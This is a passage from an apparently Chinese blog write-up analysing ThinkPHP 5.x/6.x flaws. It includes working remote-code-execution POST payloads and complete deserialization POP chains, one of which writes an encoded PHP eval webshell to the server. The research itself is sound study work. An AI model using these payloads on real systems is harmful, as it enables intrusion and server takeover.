$this-&gt;method;    &#125;</code></pre><p>关键点在</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705195700446.png" alt="image-20230705195700446"></p><p><code>Config::get(&#39;var_method&#39;)</code>是获取配置文件中的<code>var_method</code>的值，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705200127564.png" alt="image-20230705200127564"></p><p>检查是否POST了参数<code>_method</code>,然后获取POST来的_method的值，转成大写，然后将这个值当成函数去执行，该函数的参数是<code>$_POST</code></p><p>也就是POST的所有数据</p><p>这里的下一个目标是，在这个类中找到一个可以利用的方法，而且是有参方法</p><p>这里找到的是<code>__construct</code></p><pre><code class="php">protected function __construct($options = [])    &#123;        foreach ($options as $name =&gt; $item) &#123;            if (property_exists($this, $name)) &#123;                $this-&gt;$name = $item;            &#125;        &#125;        if (is_null($this-&gt;filter)) &#123;            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        &#125;        // 保存 php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    &#125;</code></pre><p>这段代码很关键</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705202147580.png" alt="image-20230705202147580"></p><p>这里会检查<code>$this</code>对象或类是否具有<code>$name</code>属性,如果有，将给这个属性赋值为<code>$item</code>，这给后面利用带来许多操作空间</p><p>该类有许多属性,现在要利用哪个还不确定</p><pre><code class="php">protected $get                  protected static $instance;protected $post                 protected $method;protected $request              protected $domain;protected $route                protected $url;protected $put;                 protected $baseUrl;protected $session              protected $baseFile;protected $file                 protected $root;protected $cookie               protected $pathinfo;protected $server               protected $path;protected $header               protected $routeInfo protected $mimeType             protected $env;protected $content;             protected $dispatch protected $filter;              protected $module;protected static $hook          protected $controller;protected $bind                 protected $action;protected $input;               protected $langset;protected $cache;               protected $param   protected $isCheckCache;    </code></pre><p>如果框架在配置文件中开启了 <code>debug</code> 模式（ <code>&#39;app_debug&#39;=&gt; true</code> ），程序会调用<code>Request</code> 类的 <code>param</code> 方法。这个方法我们需要特别关注了，因为 <code>Request</code> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <code>filterValue</code>  方法，而该方法中就存在可利用的 <code>call_user_func</code>函数。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705204938325.png" alt="image-20230705204938325"></p><p>跟进 <code>param</code> 方法。发现其调用 <code>method</code> 方法。其会调用 server方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213056585.png" alt="image-20230705213056585"></p><p>在 server 方法中把 $this-&gt;server传入了 input 方法 ,这个 $this-&gt;server的值，我们可以通过先前 Request类的 <code>__construct </code>方法来覆盖赋值</p><p>可控数据作为 $data 传入 input 方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213226503.png" alt="image-20230705213226503"></p><p>跟进input</p><p> $data会被 filterValue 方法使用 $filter 过滤器处理。其中 $filter的值部分来自$this-&gt;filter ，又是可以通过先前Request 类的<code>__construct</code>方法来覆盖赋值。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213513687.png" alt="image-20230705213513687"></p><p>接下来就是 filterValue方法调用call_user_func处理数据的过程，代码执行就是发生在这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213543908.png" alt="image-20230705213543908"></p><p>所以再开启了Debug后的exp是：</p><pre><code>POST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705214402354.png" alt="image-20230705214402354"></p><p>还有许多调用链,而且不同版本会有所不同,原理都是一样的</p><pre><code># ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h4><h5 id="高版本（5-0-24）"><a href="#高版本（5-0-24）" class="headerlink" title="高版本（5.0.24）"></a>高版本（5.0.24）</h5><p>控制器</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp5.0.24&#39;;    &#125;&#125;</code></pre><p>反序列化第一步，先找<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706093127919.png" alt="image-20230706093127919"></p><p>这里使用的是<code>process/pipes/Windows.php的__destruct()</code>，它调用了自己的<code>removeFiles()</code>方法</p><p>查看这个方法</p><pre><code class="php">private function removeFiles()    &#123;        foreach ($this-&gt;files as $filename) &#123;            if (file_exists($filename)) &#123;                @unlink($filename);            &#125;        &#125;        $this-&gt;files = [];    &#125;</code></pre><p>这个$this-&gt;files是可以控制的，经过<code>file_exists($filename)</code>可以触发<code>__tostring()</code>，这里存在一个任意文删除</p><p>全局搜索__tostring()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706094845102.png" alt="image-20230706094845102"></p><p>这里选择的是Model.php里面的<code>__tostring</code>方法</p><p>跟进其调用的<code>toJson()</code></p><pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>继续跟进<code>$this-&gt;toArray()</code>,发现这里的可控参数比较多 （这部分有点懵逼）</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706100617880.png" alt="image-20230706100617880"></p><p>这里可以找到一个触发<code>__call</code>的地方</p><p>此时，需要控制<code>$value</code>为一个带有<code>__call</code>的类对象，往上查找，$value是来自这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706101439978.png" alt="image-20230706101439978"></p><p>其中，参数 <code>$modelRelation = $this-&gt;$relation()</code> ，实际上就是 <code>think\Model</code> 类任意方法的返回结果。这里选择返回结果简单可控的 <code>getError</code> 方法</p><pre><code class="php">public function getError()&#123;    return $this-&gt;error;&#125;</code></pre><p>在getRelationData方法里，要进入第一个if语句才能赋值成想要的类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706104144796.png" alt="image-20230706104144796"></p><p>层层分析，要满足</p><pre><code>$this-&gt;append = [&#39;getError&#39;];$this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()$this-&gt;selfRelation = false;//isSelfRelation()$this-&gt;query = new Query();$this-&gt;parent = new xxx()  //调用__call</code></pre><p>全局搜索__call</p><p>这里选择的是console&#x2F;Output.php的Output类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706105401777.png" alt="image-20230706105401777"></p><pre><code class="php">public function __call($method, $args)    &#123;        if (in_array($method, $this-&gt;styles)) &#123;            array_unshift($args, $method);            return call_user_func_array([$this, &#39;block&#39;], $args);        &#125;        if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;            return call_user_func_array([$this-&gt;handle, $method], $args);        &#125; else &#123;            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);        &#125;    &#125;</code></pre><p>这个方法调用了<code>call_user_func_array</code>把第一个参数作为回调函数（<strong>callback</strong>）调用，把参数数组作（<strong>param_arr</strong>）为回调函数的的参数传入</p><p>在第一个call_user_func_array中调用了block方法</p><pre><code class="php">protected function block($style, $message)    &#123;        $this-&gt;writeln(&quot;&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;&quot;);    &#125;</code></pre><p>继续跟进writeln</p><pre><code class="php">public function writeln($messages, $type = self::OUTPUT_NORMAL)    &#123;        $this-&gt;write($messages, true, $type);    &#125;</code></pre><p>继续跟进write</p><pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)&#123;    $this-&gt;handle-&gt;write($messages, $newline, $type);&#125;</code></pre><p>$this-&gt;handle可控，可以修改为某个类，执行这个类的write</p><p>全局搜索 <code>write</code> 方法进一步利用，跟进 <code>thinkphp/library/think/session/driver/Memcached.php</code></p><pre><code class="php">public function write($sessID, $sessData)&#123;    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);&#125;</code></pre><p>这个$this-&gt;handle也是可控的，</p><p>全局搜索<code>set</code>方法,找到<code>thinkphp/library/think/cache/driver/File.php</code></p><pre><code class="php">public function set($name, $value, $expire = null)    &#123;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#39;expire&#39;];        &#125;        if ($expire instanceof \DateTime) &#123;            $expire = $expire-&gt;getTimestamp() - time();        &#125;        $filename = $this-&gt;getCacheKey($name, true);        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;            $first = true;        &#125;        $data = serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result = file_put_contents($filename, $data);        if ($result) &#123;            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);            clearstatcache();            return true;        &#125; else &#123;            return false;        &#125;    &#125;</code></pre><p>这里存在一个php文件写入，虽然前面有<code>exit()</code>避免后面的数据被执行，但是这里可以使用伪协议绕过</p><p>这里存在一个问题，只能控制文件名，写入为文件的数据来自<code>$value</code>, 根据链子传参，$value&#x3D; true ，是不可控的</p><p>而且在windows环境下，文件名存在限制</p><p>往下存在setTagItem调用，传参是文件名</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706115302269.png" alt="image-20230706115302269"></p><p>跟进查看：</p><pre><code class="php">protected function setTagItem($name)    &#123;        if ($this-&gt;tag) &#123;            $key       = &#39;tag_&#39; . md5($this-&gt;tag);            $this-&gt;tag = null;            if ($this-&gt;has($key)) &#123;                $value   = explode(&#39;,&#39;, $this-&gt;get($key));                $value[] = $name;                $value   = implode(&#39;,&#39;, array_unique($value));            &#125; else &#123;                $value = $name;            &#125;            $this-&gt;set($key, $value, 0);        &#125;    &#125;</code></pre><p>这个函数会再次调用set()方法，并且set方法的value是来自文件名$name,也就是说可以把前面的文件名写入到文件里</p><p>如果第一次调用set方法的时候把恶意代码写到文件名里，第二此调用set的时候就能够把文件名的内容写入到新的php文件里</p><p>最终POP链：</p><pre><code class="php">&lt;?phpnamespace think\process\pipes;use think\model\Pivot;class Pipes&#123;&#125;class Windows extends Pipes&#123;    private $files = [];    function __construct()&#123;        $this-&gt;files = [new Pivot()];    &#125;&#125;namespace think\model;#Relationuse think\db\Query;abstract class Relation&#123;    protected $selfRelation;    protected $query;    function __construct()&#123;        $this-&gt;selfRelation = false;        $this-&gt;query = new Query();#class Query    &#125;&#125;namespace think\model\relation;#OneToOne HasOneuse think\model\Relation;abstract class OneToOne extends Relation&#123;    function __construct()&#123;        parent::__construct();    &#125;&#125;class HasOne extends OneToOne&#123;    protected $bindAttr = [];    function __construct()&#123;        parent::__construct();        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];    &#125;&#125;namespace think\console;#Outputuse think\session\driver\Memcached;class Output&#123;    private $handle = null;    protected $styles = [];    function __construct()&#123;        $this-&gt;handle = new Memcached();//目的调用其write()        $this-&gt;styles = [&#39;getAttr&#39;];    &#125;&#125;namespace think;#Modeluse think\model\relation\HasOne;use think\console\Output;use think\db\Query;abstract class Model&#123;    protected $append = [];    protected $error;    public $parent;#修改处    protected $selfRelation;    protected $query;    protected $aaaaa;    function __construct()&#123;        $this-&gt;parent = new Output();#Output对象,目的是调用__call()        $this-&gt;append = [&#39;getError&#39;];        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()        $this-&gt;selfRelation = false;//isSelfRelation()        $this-&gt;query = new Query();    &#125;&#125;namespace think\db;#Queryuse think\console\Output;class Query&#123;    protected $model;    function __construct()&#123;        $this-&gt;model = new Output();    &#125;&#125;namespace think\session\driver;#Memcacheduse think\cache\driver\File;class Memcached&#123;    protected $handler = null;    function __construct()&#123;        $this-&gt;handler = new File();//目的调用File-&gt;set()    &#125;&#125;namespace think\cache\driver;#Fileclass File&#123;    protected $options = [];    protected $tag;    function __construct()&#123;        $this-&gt;options = [            &#39;expire&#39;        =&gt; 0,            &#39;cache_subdir&#39;  =&gt; false,            &#39;prefix&#39;        =&gt; &#39;&#39;,            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,            &#39;data_compress&#39; =&gt; false,        ];        $this-&gt;tag = true;    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><h5 id="低版本-（5-0-3）"><a href="#低版本-（5-0-3）" class="headerlink" title="低版本 （5.0.3）"></a>低版本 （5.0.3）</h5><p>控制器</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp&#39;;    &#125;&#125;</code></pre><p>因为低版本的toArray()函数和高版本的有所不同，不存在调用__call()的条件，所以需要重新找一条链子</p><p>从<code>__destruct</code>开始找,除了<code>process/pipes/Windows.php</code>外还有3个可以选,但是只有一条是可利用的   <code>Process.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706144327242.png" alt="image-20230706144327242"></p><p>这里调用了<code>stop()</code>方法,跟进查看</p><pre><code class="php">public function stop()    &#123;        if ($this-&gt;isRunning()) &#123;            if (&#39;\\&#39; === DS &amp;&amp; !$this-&gt;isSigchildEnabled()) &#123;                exec(sprintf(&#39;taskkill /F /T /PID %d 2&gt;&amp;1&#39;, $this-&gt;getPid()), $output, $exitCode);                if ($exitCode &gt; 0) &#123;                    throw new \RuntimeException(&#39;Unable to kill the process&#39;);                &#125;            &#125; else &#123;                $pids = preg_split(&#39;/\s+/&#39;, `ps -o pid --no-heading --ppid &#123;$this-&gt;getPid()&#125;`);                foreach ($pids as $pid) &#123;                    if (is_numeric($pid)) &#123;                        posix_kill($pid, 9);                    &#125;                &#125;            &#125;        &#125;        $this-&gt;updateStatus(false);        if ($this-&gt;processInformation[&#39;running&#39;]) &#123;            $this-&gt;close();        &#125;        return $this-&gt;exitcode;    &#125;</code></pre><p>跟进<code>isRunning()</code></p><pre><code class="php">public function isRunning()    &#123;        if (self::STATUS_STARTED !== $this-&gt;status) &#123;            return false;        &#125;        $this-&gt;updateStatus(false);        return $this-&gt;processInformation[&#39;running&#39;];    &#125;</code></pre><p>里面会调用一个updateStatus方法，并且$this-&gt;status可控，可以让程序走到这</p><p>跟进查看</p><pre><code class="php">    protected function updateStatus($blocking)    &#123;        if (self::STATUS_STARTED !== $this-&gt;status) &#123;            return;        &#125;        $this-&gt;processInformation = proc_get_status($this-&gt;process);        $this-&gt;captureExitCode();        $this-&gt;readPipes($blocking, &#39;\\&#39; === DS ? !$this-&gt;processInformation[&#39;running&#39;] : true);        if (!$this-&gt;processInformation[&#39;running&#39;]) &#123;            $this-&gt;close();        &#125;    &#125;</code></pre><p>后面的$this-&gt;close()是可以利用的，第一行就可以触发__call</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150633080.png" alt="image-20230706150633080"></p><p>但是程序走不到这里，当运行<code>proc_get_status</code>的时候就会报错退出了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150555278.png" alt="image-20230706150555278"></p><p>这里的close()是不能利用了</p><p>在上面的 stop()方法中，后面就自带了 <code>close（）</code>,利用这个就行,只需：</p><pre><code class="php">$this-&gt;processInformation[&#39;running&#39;]=true;$this-&gt;status=3;//只有不相等就行</code></pre><p>跟进<code>close()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706152017394.png" alt="image-20230706152017394"></p><p>这里触发__call(),需要控制<code>$this-&gt;processPipes</code></p><p>尝试直接触发think\console\Output类中的__call魔术方法。由于block方法需要2个参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706153015240.png" alt="image-20230706153015240"></p><p>需要找到另外一个__call方法</p><p>最终找到<code>model/Relation.php</code>这个文件下的__call</p><pre><code class="php">public function __call($method, $args)    &#123;        if ($this-&gt;query) &#123;            switch ($this-&gt;type) &#123;                case self::HAS_MANY:                    if (isset($this-&gt;where)) &#123;                        $this-&gt;query-&gt;where($this-&gt;where);                    &#125; elseif (isset($this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;)) &#123;                        // 关联查询带入关联条件                        $this-&gt;query-&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);                    &#125;                    break;                case self::HAS_MANY_THROUGH:                    $through      = $this-&gt;middle;                    $model        = $this-&gt;model;                    $alias        = Loader::parseName(basename(str_replace(&#39;\\&#39;, &#39;/&#39;, $model)));                    $throughTable = $through::getTable();                    $pk           = (new $this-&gt;model)-&gt;getPk();                    $throughKey   = $this-&gt;throughKey;                    $modelTable   = $this-&gt;parent-&gt;getTable();                    $this-&gt;query-&gt;field($alias . &#39;.*&#39;)-&gt;alias($alias)                        -&gt;join($throughTable, $throughTable . &#39;.&#39; . $pk . &#39;=&#39; . $alias . &#39;.&#39; . $throughKey)                        -&gt;join($modelTable, $modelTable . &#39;.&#39; . $this-&gt;localKey . &#39;=&#39; . $throughTable . &#39;.&#39; . $this-&gt;foreignKey)                        -&gt;where($throughTable . &#39;.&#39; . $this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);                    break;                case self::BELONGS_TO_MANY:                    // TODO            &#125;            $result = call_user_func_array([$this-&gt;query, $method], $args);            if ($result instanceof \think\db\Query) &#123;                $this-&gt;option = $result-&gt;getOptions();                return $this;            &#125; else &#123;                $this-&gt;option = [];                return $result;            &#125;        &#125; else &#123;            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);        &#125;    &#125;</code></pre><p>这个__call就非常的好用，query和type和where都可以控制</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706155221160.png" alt="image-20230706155221160"></p><p>这里就可以构造，调用上面Output类的__call()方法了</p><pre><code class="php">class Relation&#123;    protected $query;    const HAS_ONE          = 1;    const HAS_MANY         = 2;    const HAS_MANY_THROUGH = 5;    const BELONGS_TO       = 3;    const BELONGS_TO_MANY  = 4;    protected $type=2;    protected $where=1;    public function __construct()    &#123;        $this-&gt;query=new Output();    &#125;&#125;</code></pre><p>跟进<code>Output</code>中的<code>__call</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706163554437.png" alt="image-20230706163554437"></p><p>进行跟进</p><pre><code>__call--&gt;block--&gt;writeln--&gt;write--&gt;</code></pre><pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)    &#123;        $this-&gt;handle-&gt;write($messages, $newline, $type);    &#125;</code></pre><p>通过这里可以调用任意类的write方法，</p><p>这里找到两个一样的，都调用了set方法</p><pre><code class="php">//session/driver/Memcache.phppublic function write($sessID, $sessData)    &#123;        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, 0, $this-&gt;config[&#39;expire&#39;]);    &#125;</code></pre><pre><code class="php">//session/driver/Memcached.phppublic function write($sessID, $sessData)    &#123;        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);    &#125;</code></pre><p>最后选择了<code>session/driver/Memcached.php</code></p><p>全局搜索set方法，和高版本的一样，使用cache&#x2F;driver&#x2F;File.php这里的set,</p><p>后面的操作是和高版本的相同的，调用了两次set方法，然后第二次调用的时候吧恶意代码存进php文件里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706171130685.png" alt="image-20230706171130685"></p><p>注意：因为windows对文件名存在限制，这个pop链只能在linux环境使用</p><pre><code class="php">&lt;?phpnamespace think;class Process&#123;    private $processPipes;    private $status;    private $processInformation;    public function  __construct()&#123;        $this-&gt;processInformation[&#39;running&#39;]=true;        $this-&gt;status=3;        $this-&gt;processPipes=new \think\model\Relation();    &#125;&#125;namespace think\model;use think\console\Output;class Relation&#123;    protected $query;    const HAS_ONE          = 1;    const HAS_MANY         = 2;    const HAS_MANY_THROUGH = 5;    const BELONGS_TO       = 3;    const BELONGS_TO_MANY  = 4;    protected $type=2;    protected $where=1;    public function __construct()    &#123;        $this-&gt;query=new Output();    &#125;&#125;namespace think\console;use think\session\driver\Memcached;class Output&#123;    protected $styles = [        &#39;info&#39;,        &#39;error&#39;,        &#39;comment&#39;,        &#39;question&#39;,        &#39;highlight&#39;,        &#39;warning&#39;,        &#39;getTable&#39;,        &#39;where&#39;    ];    private $handle;    public function __construct()    &#123;//        $this-&gt;handle = (new \think\session\driver\Memcache);        $this-&gt;handle = new Memcached();//目的调用其write()//        $this-&gt;styles = [&#39;getAttr&#39;];    &#125;&#125;namespace think\session\driver;#Memcacheduse think\cache\driver\File;class Memcached&#123;    protected $tag;    protected $handler;    public function __construct()    &#123;        $this-&gt;tag = true;           $this-&gt;handler = (new File);    &#125;&#125;namespace think\cache\driver;use think\cache\Driver;class File extends Driver&#123;    protected $tag;    protected $options;    public function __construct()    &#123;        $this-&gt;tag = false;        $this-&gt;options = [            &#39;expire&#39;        =&gt; 0,            &#39;cache_subdir&#39;  =&gt; false,            &#39;prefix&#39;        =&gt; &#39;&#39;,            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,            &#39;data_compress&#39; =&gt; false,        ];        $this-&gt;tag = true;    &#125;&#125;namespace think\cache;abstract class Driver&#123;&#125;use think\Process;$a=new Process();echo urlencode(serialize($a));</code></pre><h4 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h4><p>5.1.30</p><pre><code class="php">public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp&#39;;    &#125;</code></pre><p>全局搜索__destruct ， 这里使用的是think&#x2F;process&#x2F;pipes&#x2F;Windows.php的</p><pre><code class="php">public function __destruct()    &#123;        $this-&gt;close();        $this-&gt;removeFiles();    &#125;</code></pre><p>跟进<code>removeFiles()</code></p><pre><code class="php">private function removeFiles()    &#123;        foreach ($this-&gt;files as $filename) &#123;            if (file_exists($filename)) &#123;                @unlink($filename);            &#125;        &#125;        $this-&gt;files = [];    &#125;</code></pre><p>这里存在一个任意文删除，因为$this-&gt;files可控，还可以触发<code>__toString</code></p><p>全局搜索<code>__toString</code> </p><p>存在13个结果，但是这里使用的是<code>think/model/concern/Conversion.php</code>的<code>__toString </code>方法</p><pre><code class="php">public function __toString()    &#123;        return $this-&gt;toJson();    &#125;</code></pre><p>到这里先构造部分POP链</p><pre><code class="php">namespace think\process\pipes;use think\model\concern\Conversion;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[xxx];//    &#125;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><p>这里的xxx是只向<code>Conversion.php</code>的<code>__toString </code>方法所在的类<code>Conversion</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194702593.png" alt="image-20230706194702593"></p><p>由于<code>convertion</code>是<code>trait</code>类，Trait是一种代码复用机制，它允许在不同类之间共享方法的代码块</p><p>所以只要找到一个使用了conversion的类即可，全局搜索conversion只找到Model类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194922743.png" alt="image-20230706194922743"></p><p>由于Model是抽象类，我们得找到<code>Model</code>的实现类，全局搜索<code>extends Model</code>找到<code>Pivot</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706195420277.png" alt="image-20230706195420277"></p><p>所以exp要这样写</p><pre><code class="php">namespace think\process\pipes;abstract class Pipes&#123;&#125;namespace think\process\pipes;use think\model\Pivot;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think;abstract class Model&#123;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><p>回到<code>__toString</code>跟进这个<code>toJson()</code>方法</p><pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>跟进<code>toArray()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706204511419.png" alt="image-20230706204511419"></p><p>在这里可以看到有许多参数都是可控的，例如$this-&gt;data，$this-&gt;relation，$this-&gt;visible，$this-&gt;append</p><p>这里能够使用的是<code>getAttr()</code>方法</p><p>先查看这个方法：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211615736.png" alt="image-20230706211615736"></p><p>这个$closure是可控的，可以用来调用任意函数，其参数$value,是由上一层传来的参数控制，也可控</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211900803.png" alt="image-20230706211900803"></p><p>这个$key来自<code>$this-&gt;data</code>,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706212008652.png" alt="image-20230706212008652"></p><p>所以只是需要如下构造，即可实现system(‘calc’)</p><pre><code class="php">protected $append = [&#39;a&#39;=&gt;[]];    private $withAttr = [];    private $data = [];    public function __construct($data = [])    &#123;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;</code></pre><p>最终的调用栈</p><pre><code>Attribute.php:511, think\Model-&gt;getAttr()Conversion.php:161, think\Model-&gt;toArray()Conversion.php:209, think\Model-&gt;toJson()Conversion.php:225, think\Model-&gt;__toString()Windows.php:163, file_exists()Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()Windows.php:59, think\process\pipes\Windows-&gt;__destruct()Container.php:395, app\index\controller\Index-&gt;index()Container.php:395, ReflectionMethod-&gt;invokeArgs()Container.php:395, think\Container-&gt;invokeReflectMethod()Module.php:135, think\route\dispatch\Module-&gt;think\route\dispatch\&#123;closure&#125;()Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()Middleware.php:130, think\Middleware-&gt;dispatch()Module.php:140, think\route\dispatch\Module-&gt;exec()Dispatch.php:168, think\route\Dispatch-&gt;run()App.php:432, think\App-&gt;think\&#123;closure&#125;()Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()Middleware.php:130, think\Middleware-&gt;dispatch()App.php:435, think\App-&gt;run()index.php:21, &#123;main&#125;()</code></pre><p>POP链</p><pre><code class="php">&lt;?phpnamespace think\process\pipes;abstract class Pipes&#123;&#125;namespace think\process\pipes;use think\model\Pivot;class Windows extends Pipes&#123;    private $files=[];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think;abstract class Model&#123;    protected $append = [&#39;a&#39;=&gt;[]];    private $withAttr = [];    private $data = [];    public function __construct($data = [])    &#123;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));</code></pre><h4 id="5-2-x"><a href="#5-2-x" class="headerlink" title="5.2.x"></a>5.2.x</h4><p>(无测试环境，暂时PASS)</p><h2 id="ThinkPHP-6-x"><a href="#ThinkPHP-6-x" class="headerlink" title="ThinkPHP 6.x"></a>ThinkPHP 6.x</h2><h3 id="任意php文件包含-6-0-1-6-0-13，5-0-x，5-1-x"><a href="#任意php文件包含-6-0-1-6-0-13，5-0-x，5-1-x" class="headerlink" title="任意php文件包含(6.0.1~6.0.13，5.0.x，5.1.x)"></a>任意php文件包含(6.0.1~6.0.13，5.0.x，5.1.x)</h3><p>漏洞描述：</p><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含</p><p>和6.0.14版本比较，发现官方删除了Lang.php的detect函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708190607220.png" alt="image-20230708190607220"></p><p>LoadLangPack.php的detect函数也有修改</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708190749712.png" alt="image-20230708190749712"></p><p>分析这个detect()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230708191822492.png" 